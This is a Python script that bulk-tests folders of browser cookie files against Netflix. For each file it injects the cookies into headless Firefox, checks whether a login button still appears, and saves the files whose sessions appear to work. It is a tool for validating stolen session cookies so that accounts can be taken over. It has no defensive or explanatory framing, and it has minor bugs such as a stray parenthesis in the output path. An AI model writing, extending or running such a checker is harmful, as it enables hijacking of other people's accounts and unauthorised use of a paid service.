import json
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.firefox.options import Options
import os
import tkinter
from tkinter import filedialog

tkinter.Tk().withdraw()
folder_path = filedialog.askdirectory()
print(folder_path)


def load_cookies_from_json(filepath):
    with open(filepath, 'r') as cookie_file:
        cookies = json.load(cookie_file)
    return cookies


def open_webpage_with_cookies(url, cookies):
    global driver
    firefox_options = Options()
    firefox_options.headless = True
    driver = webdriver.Firefox(options=firefox_options)
    driver.get(url)

    for cookie in cookies:
        driver.add_cookie(cookie)

    driver.refresh()

    if driver.find_elements(By.CSS_SELECTOR, '.btn'):
        print(f"Cookie Not working - {filename}")
        driver.quit()
    else:
        print(f"Working cookie found! - {filename}")
        a = open(f'working_cookies/{filename})', 'w')
        a.write(content)
        driver.quit()


for filename in os.listdir(folder_path):
    filepath = os.path.join(folder_path, filename)
    if os.path.isfile(filepath):
        with open(filepath, 'r') as file:
            content = file.read()

            url = 'https://netflix.com/login'

            try:
                cookies = load_cookies_from_json(filepath)
                open_webpage_with_cookies(url, cookies)
            except:
                print(f"Invalid Cookie - {filename}")
                driver.quit()
